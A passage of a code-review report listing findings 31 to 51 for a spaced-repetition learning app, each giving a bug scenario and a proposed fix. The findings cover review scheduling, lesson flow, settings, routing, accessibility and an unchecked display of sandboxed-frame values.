- **Scenario:** Dan answers a recall card and taps 'Continue, Claude will grade it'. If it was the last card, he then sees 'Saving your answers…' for up to 30 s. He taps X. cleanup() calls refreshBadge straight away, before the pending save has landed, so the card still counts as due. Today shares that plan and says '1 card to revisit', and Start review would show the same card again for a second answer. When the save lands a few seconds later, nothing refreshes the badge. It stays at 1 while nothing is due, until the app is hidden and shown again.
- **Fix:** In cleanup, also refresh once the outstanding saves settle: `Promise.race([Promise.all(S.saves), U.sleep(32000)]).then(function () { U.review.refreshBadge(); });`. To stop Today offering a card that is mid-save, keep a module-level set of card ids with a save in flight (added in save(), removed when it settles) and filter them out in plan().

## 31. [minor] Turning on Light day after some reviews shows '0 cards to revisit', and Start review then says nothing is due

- **Where:** `app/src/js/60-today.js:423` (lens: review)
- **Scenario:** Dan has reviewed 6 cards today (cap 15) and 8 more are due. He turns on 'Light day' on Today. The plan box now reads '0 cards to revisit · About 1 minute' and still offers Start review. Tapping it shows 'Nothing to review right now. Everything you have learned is holding up for now.', which is wrong: 8 cards are due and he has just reached the light-day limit. The 'Done for today' state with 'Review 5 more' never appears.
- **Fix:** In the switch handler, when the new plan's size is 0, redraw the screen with drawClear (pass the new plan, so it shows 'Done for today' and 'Review 5 more'). In reviewView, when the plan has due cards beyond its size, show a 'You've reached today's limit' message with a 'Review 5 more' link instead of 'holding up for now'.

## 32. [minor] The review day turns over at local midnight, so cards answered at 23:55 come due 5 minutes later

- **Where:** `app/src/js/40-fsrs.js:63` (lens: review)
- **Scenario:** Dan finishes a lesson at 23:55, or answers a review card Again at 23:55. The card is due 'tomorrow', which starts at 00:00. At 00:01 the badge and Today ask him to review cards he answered six minutes earlier. Getting one right then counts as its first spaced review (Good: 3.71-day stability, back in about 4 days), so the first real gap is lost. Late-night study is normal on a phone, and day-granular FSRS schedulers use a rollover hour for this reason (Anki's default is 4 am).
- **Fix:** Use a study day with a rollover hour for everything in review: add `U.studyDay = function (d) { return U.today(new Date((d ? +d : Date.now()) - 4 * 3600e3)); }` and use it in place of U.today() in 40-fsrs callers, plan(), save(), addFromLesson(), dayOf/reviewedOn, lightToday and 41-cards nextDays. Update ARCHITECTURE.md section 8 to match.

## 33. [minor] ARCHITECTURE.md says 'got it' on a recall card is Easy; the code always grades it Good

- **Where:** `docs/ARCHITECTURE.md:398` (lens: review)
- **Scenario:** Section 8, the contract between modules, says recall cards are graded 'got-it = Easy (Good without nailed)'. Commit 4bf50b8 deliberately changed verdictGrade to always return Good and ignore `nailed` ('Easy is Dan's call'), but the doc was not updated. CLAUDE.md says to read ARCHITECTURE.md before changing code, and the doc says code and doc must change together. Anyone working from the doc, such as an eval or a test of recall scheduling, will expect a nailed answer to be scheduled as Easy (about 2 weeks out instead of about 4 days on a first review).
- **Fix:** Change ARCHITECTURE.md section 8 to: 'got-it = Good (Claude never awards Easy; Dan can choose it with Change), partly = Hard, not-yet = Again; no grade (failure, or 30 s) = Hard.'

## 34. [minor] A say-it-back grade that lands after a new round began is filed under the new round, so the old lesson's answer stands in for the new lesson's say-it-back

- **Where:** `app/src/js/50-lesson.js:851` (lens: lesson)
- **Scenario:** Dan sends his explanation. While it is being graded he taps "This looks wrong" and then "Rebuild this lesson" (the same happens when another device starts Learn it again and adopt() swaps st.ip before the reroute). record() stamps `rec.round = round()` when the grade lands, which is by then the new round. In the fresh lesson's Say it back:
- the compose box is hidden;
- his answer to the old prompt is shown as "You've got it", with only Continue offered;
- he is never asked to explain the new lesson;
- at Done the recall card pairs the new prompt and rubric with the old answer, and the old `met` flags tick the new rubric points.
- **Fix:** Capture the round when the answer is sent. In submit(), add `var r0 = round();` and pass it to record(), which sets `rec.round = r0`. Push to `attempts` and `st.ip.say` and update the screen only when `r0 === round()`. The entry is still saved, so the Book keeps his words.

## 35. [minor] On resume at Play, opening the collapsed Predict shows "What happens" (the answer) before Dan has played

- **Where:** `app/src/js/50-lesson.js:525` (lens: lesson)
- **Scenario:** Dan made his guess and left before playing. He reopens the lesson: Play is live, and Predict is a collapsed summary ("You guessed: …"). Tapping it, or the Predict segment in the progress bar, renders `guessAndReveal()`, which includes the lesson's reveal ("It takes about 1.4 times as long…"). The answer is shown before he plays. That breaks predict, then play, then reveal: in the live flow the reveal appears only after "I've had a play".
- **Fix:** Show only the guess in the collapsed Predict until Play is finished. Use `if (!live) { box.appendChild(guessAndReveal(!st.closed.play)); return; }` with an argument that omits the "What happens" block. By the time the collapsed section is drawn, st.closed.play is set for any resume past Play, and the Play section shows the reveal itself after "I've had a play".

## 36. [minor] During a target check, Ask Claude is told the Play interactive's settings, not the ones Dan is moving in the check

- **Where:** `app/src/js/50-lesson.js:1041` (lens: lesson)
- **Scenario:** A target check mounts its own copy of the interactive (41-cards), but openTutor always passes `st.liveMount`, which is the Play stage's frame. Dan left Play at 0.5 m, sets the check's slider to 2.2 m and asks "Am I close?". The sheet says "Claude can see this lesson and where your controls are set", but the prompt says his controls are at L=0.5 (T=1.42 s). Claude's hint is then based on the wrong setting, on the one question where the setting is the point.
- **Fix:** Smallest fix: in openTutor, pass no getState while the Checks stage is live (`getState: st.stage !== 'checks' && m && typeof m.get === 'function' ? … : null`), so Claude is never told a setting Dan isn't using. Better: have the target card expose its mount (for example el.mount) and pass that card's get() while it is on screen.

## 37. [minor] Settings show the defaults until the profile read finishes (for the whole visit if it fails), and one change resets every other setting

- **Where:** `app/src/js/74-settings.js:24` (lens: views)
- **Scenario:** U.settings.prefs starts as clean() (light, medium, easy off, cap 15), while head.html has already painted the device's saved prefs, for example dark, XL and easier reading. Only loadPrefs() replaces it, after U.rt.ready and a successful db read. The Aa button works from the first moment (99-boot.js:87), and if the profile read fails the defaults stay for the whole visit. In that window the sheet shows Light, Medium, easier reading off and 15. If Dan taps one control, set() builds on the defaults, so dark, XL and easier reading all switch off at once, and the mu-prefs mirror is overwritten. A change made before boot also goes to U.memdb ('local/me/profile', since there is no uid yet) and is then undone when the db prefs load.
- **Fix:** Start from the device copy: `prefs: clean(readLocalPrefs())`, reading localStorage 'mu-prefs' the same way readLocal does. In loadPrefs, if S._localAt is set (a change made since the page opened), patch the profile with S.prefs instead of applying doc.prefs over it. Have the Aa handler wait for U.rt.ready before its first write, or queue set()'s profile patch until then.

## 38. [minor] In-memory route fallback: going back to the address the page started on takes two taps

- **Where:** `app/src/js/00-core.js:231` (lens: views)
- **Scenario:** This applies when the frame refuses fragment changes, which is the case U._memHash exists for. Boot is at '#/'. Dan opens Map, so _memHash becomes '#/map' and location.hash stays '#/'. Then he taps Learn. U.go('#/') sees currentHash '#/map', assigns location.hash = '#/' (unchanged, so no hashchange fires), finds location.hash === hash, clears _memHash and never calls _route(). The Map stays on screen until he taps again. This happens every time he returns to the screen whose hash the frame still holds.
- **Fix:** Remember the hash before assigning: `var before = location.hash; try { location.hash = hash; } catch (e) {} if (location.hash !== hash) { U._memHash = hash; U._route(); } else { U._memHash = null; if (before === hash) U._route(); }`. Related hardening for U._home: `location.replace('#/')` resolves against the document base URL, and in a sandboxed srcdoc frame that navigated the frame to the host page (p3d-srcdoc-replace-http.mjs). `location.replace(location.href.split('#')[0] + '#/')` avoids that.

## 39. [minor] Study minutes stop counting while Dan plays with the interactive

- **Where:** `app/src/js/99-boot.js:30` (lens: views)
- **Scenario:** Study time counts only when the host document saw pointerdown, keydown, wheel, touchstart, input or scroll within IDLE (2 min). Taps and drags inside the sandboxed interactive iframe never reach the parent document. Playing with an interactive for more than 2 minutes without touching the page around it stops the count, which is the core 'learn by doing' activity. Today's 'This week' minutes then under-report what he actually studied.
- **Fix:** In start(), also poke on the kit's change messages: `window.addEventListener('message', function (e) { var d = e.data; if (d && d.src === 'kit' && (d.type === 'change' || d.type === 'state')) study.poke(); });`. Alternatively, call U.boot.study.poke() from 32-sandbox's 'change' handler.

## 40. [minor] A deleted, missing or unloadable topic page has no h1, so focus stays on the page body and the title still says 'Topic'

- **Where:** `app/src/js/71-topic.js:153` (lens: views)
- **Scenario:** Dan deletes a topic, then presses Back, or opens a Book or Map link to a topic deleted on another device. goneView() renders 'This topic is not here any more' as an h2 (from V.empty), and the error state (V.loadError) has no heading either. U._focusScreen waits for an h1 that never comes and gives up after 6 s. Focus stays on <body>, a screen reader announces nothing, and document.title stays 'Topic · My University'. The same 6 s cut-off means a topic that takes longer than 6 s to load never gets focus moved to it.
- **Fix:** In goneView(), use a heading of its own: `U.h('h1', {class:'not-here-h'}, 'This topic is not here any more')` above the text and the 'Back to Learn' action, or reuse U.notHere(). Call U.setTitle('Topic not found'). Give the error state an h1 as well, such as 'This topic could not be loaded'.

## 41. [minor] False positive: a standard screen-reader-only live region fails as 'cut off', pushing repairs to remove it or dropping the page

- **Where:** `app/kit/kit.js:1681` (lens: kit)
- **Scenario:** A body announces changes to screen readers with the usual visually-hidden region: <span aria-live="polite" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap">, updated in K.update. The self-test fails it at every width. The repair prompt then says 'never cut it off or hide the overflow', which steers the model to delete the accessibility text. If the model keeps it, salvage() rejects the page after two repairs because report.passed is false, and the idea ships with no interactive.
- **Fix:** In clippedNow, skip text whose clipping ancestor is deliberately visually hidden: a box no bigger than 1×1 px, or computed clip 'rect(0px, 0px, 0px, 0px)', or clip-path 'inset(50%)'.

## 42. [minor] False positive: diagonal SVG labels (rotated timeline years) are reported as 'printed over each other' when they don't touch

- **Where:** `app/kit/kit.js:1732` (lens: kit)
- **Scenario:** A history timeline on a phone rotates year labels by −45° to fit: transform='rotate(-45 x 52)', 42 viewBox units apart. On screen they are clearly separate, yet the self-test fails all six neighbouring pairs at every width. The repair then has to un-rotate them, which makes them really collide, or the page is dropped. This happens because getBoundingClientRect gives the axis-aligned box of rotated text, and neighbouring boxes overlap even though the glyphs don't.
- **Fix:** When a text element's getScreenCTM() has rotation (|b| or |c| > 1e-6), test overlap on oriented boxes instead: map the getBBox() corners through the CTM and use a separating-axis test. Apply the same to the 'outside its drawing' test. Keep axis-aligned boxes for unrotated text.

## 43. [minor] merge() takes the ids from the first width even when that width failed, so the repair prompt falsely says ids are missing

- **Where:** `app/src/js/32-sandbox.js:377` (lens: kit)
- **Scenario:** On a slow phone the 340 px test frame times out (or its self-test does), while 720 and 1040 pass. merge() copies controls, outputs, inputs and actions from reports[0], which is the empty failing() report. U.interactive.problems() then adds 'Missing control id "r"' and 'Missing output "eff"' to the repair prompt, although the page has both. The model is told to rename or duplicate working ids, which can break a good page.
- **Fix:** Choose the template report as the first one that actually ran: `var first = reports.filter(function (r) { return r.ready || (r.controls && r.controls.length); })[0] || reports[0];`. Use it for checks, controls, readouts, outputs, inputs and actions.

## 44. [minor] The automatic halo overrides a label's own stroke: outlined text turns invisible, and the halo grows with small viewBoxes

- **Where:** `app/kit/kit.css:89` (lens: kit)
- **Scenario:** A drawing uses outlined lettering: <text fill="none" stroke="#17324D" stroke-width="1.5">. haloOne reads fill 'none', and rgbaOf('none') returns black (the canvas rejected it), so the text counts as high-contrast and gets k-halo. The CSS rule `svg text.k-halo { stroke: var(--k-bg); stroke-width: 3px }` beats presentation attributes, so the stroke becomes the page colour and the word disappears. Any SVG text with its own stroke loses it the same way. Also, stroke-width:3px is in viewBox units: in a 100-unit-wide drawing a 5-unit label gets a halo about 30% of its size, which notches a line it doesn't cross.
- **Fix:** In haloOne, leave out text whose computed stroke is not 'none', and text whose fill can't be parsed (needs rgbaOf to return null for unparseable colours; see the K.color finding). Size the halo relative to the text rather than in user units, e.g. `stroke-width: .2em`.

## 45. [minor] K.choice reads the lesson's 0-based index as a value when options are digit names, so it opens on the wrong option

- **Where:** `app/kit/kit.js:523` (lens: kit)
- **Scenario:** KIT.md:49 says a choice's value is 'an option's value or its 0-based index (as lesson controls with options give it)'. A lesson control {id:'n', options:['1','2','4','8'], value:1} means 'starts at "2"', and the build prompt describes it that way. A body that passes the lesson's value as told, K.choice({options:['1','2','4','8'], value:1}), opens on '1', because find() tries String(value) === String(option value) before treating the number as an index. The opening state then disagrees with the predict question and the 'What am I looking at?' numbers.
- **Fix:** In K.choice, when o.value is a number and every option value is a string, use it as an index first. Or have KIT.md tell bodies to pass the option's name, never the lesson's index.

## 46. [minor] A choice control's value from the frame is printed unchecked in the app's own "What am I looking at?" panel

- **Where:** `app/src/js/50-lesson.js:718` (lens: security)
- **Scenario:** ce034f6 says frame text 'never appears in the app's own interface' (error text and the checks badge were fixed). drawNotes still shows `params[id]` from `mount.get()` for any control the lesson declares with `options`. If the value is a string, it is printed as `'now ' + raw`, with no check against the lesson's options and no length limit. The kit's K.choice returns the chosen option's `value` (KIT.md: `params[id]` is the chosen value), and the body sets that value to any string. A body can therefore put any sentence of its choosing into the app chrome, outside the frame, styled as the app's own description of the interactive. An honest body that uses `{value:'s', label:'Short'}` options also shows the internal value ('now s') instead of the label Dan sees.
- **Fix:** Show a named control's value only when it maps to one of the lesson's own options; otherwise keep the starting value:
```js
var opts = x.c.options.map(String);
text = typeof raw === 'number' ? (opts[raw] != null ? opts[raw] : null) : (opts.indexOf(String(raw)) >= 0 ? String(raw) : null);
```
If option values must differ from labels, map value to label with `mount.inputs()`, which reports each option, and still show only text from the lesson.

## 47. [minor] A topic whose research kept zero sources is labelled 'Sources checked' while its lessons say 'Not yet source-checked'

- **Where:** `app/src/js/31-generate.js:374` (lens: a11y-rules)
- **Scenario:** Research runs, but every source fails verification (URL not returned by the tools, or quote not found on the page), so res.kept is 0. The topic is still saved with research.status 'done'. The Learn card shows the 'Sources checked' badge and the Library says 'Sources checked' with a tick and lists nothing. Every lesson then has sources.length 0, so sourced=false and Explain says 'Not yet source-checked'. The topic-level label dresses unsourced lessons up as checked, against the 'never dressed up' rule.
- **Fix:** When res.kept === 0, save a status that reads as not checked (e.g. status 'failed' with error 'No source could be confirmed', or a new 'empty' status handled like failed). Show the Learn badge and the Library's 'Sources checked' only when r.sources > 0. Otherwise show the existing 'not source-checked yet' wording with 'Check the sources again'.

## 48. [minor] In lessons, a focused element can hide completely under the sticky lesson bar (WCAG 2.4.11)

- **Where:** `app/src/css/10-base.css:16` (lens: a11y-rules)
- **Scenario:** In focus mode (lesson, review) --topbar-h is 0, so html scroll-padding-top is only 8px. The lesson has its own sticky .lsn-bar (about 56px plus padding) at the top. A keyboard user Shift+Tabs back through a lesson. The browser scrolls each focused element to 8px from the top, under the bar, so the focus ring and the control are invisible. For example, a footnote button in Explain ends up 100% covered. The review's sticky .rv-top and docked .qc-foot have the same gap.
- **Fix:** Reserve the focus-mode bars in scroll padding, e.g. `html:has(.lsn-bar) { scroll-padding-top: calc(56px + 1rem); } html:has(.rv-top) { scroll-padding-top: 72px; } html:has(.qc-review .qc-foot:not(.qc-unstick)) { scroll-padding-bottom: 110px; }`, or set the same scroll-margin on focusable elements inside .lsn and .rv.

## 49. [minor] The app's radio groups (Settings, Learn level) ignore arrow keys, and every option is a separate Tab stop

- **Where:** `app/src/js/74-settings.js:104` (lens: a11y-rules)
- **Scenario:** Settings' Appearance, Text size, Layout and 'Most reviews in a day', and Learn's 'How well do you know it?', are role=radiogroup with role=radio buttons. A screen-reader user is told 'radio button, 1 of 3' and presses the arrow keys, as radio groups expect, and nothing happens. A keyboard user has to Tab through all 14 options in the Settings sheet. The kit's own K.choice gets this right (roving tabindex plus arrow keys, kit.js:536-557), so the app's radios behave differently from the ones in its interactives.
- **Fix:** In seg() and in the Learn levelChips, give only the checked radio tabIndex 0 (the others -1). Add a keydown handler that moves both selection and focus on ArrowLeft/Up/Right/Down (wrapping) and calls onPick, as kit.js K.choice does.

## 50. [minor] Named-choice controls in every interactive are 40 px tall, below the 44 px tap-target rule

- **Where:** `app/kit/kit.css:181` (lens: a11y-rules)
- **Scenario:** Any generated interactive that uses K.choice (named options, e.g. sorting-elements) draws its options as .k-seg buttons with min-height 40px. When they stack on a phone, each is 284x40 with a 4px gap. This breaks the rule in CLAUDE.md, ARCHITECTURE.md section 3 and KIT.md:149 ('tap targets at least 44 px'), and they are hard to hit on Dan's 360 px phone.
- **Fix:** `.k-seg button { min-height: 44px; }` (the stack layout's 4px gap can stay).

## 51. [minor] Learn and Today give different times for the same reviews (about 3 minutes vs about 5)

- **Where:** `app/src/js/70-learn.js:370` (lens: a11y-rules)
- **Scenario:** With 6 cards due (2 choice, target, order, estimate, recall), Learn's row says '6 reviews ready · About 3 minutes', and one tap later Today says '6 cards to revisit · About 5 minutes'. Learn assumes 25 s per card whatever its type, while Today uses per-type times. The gap grows with recall and target cards, so Learn understates the commitment it is inviting Dan into.
- **Fix:** Expose the Today estimate (e.g. U.review.minutes() returning minutesFor(plan.queue)) and use it in renderToday, so both screens show one number.

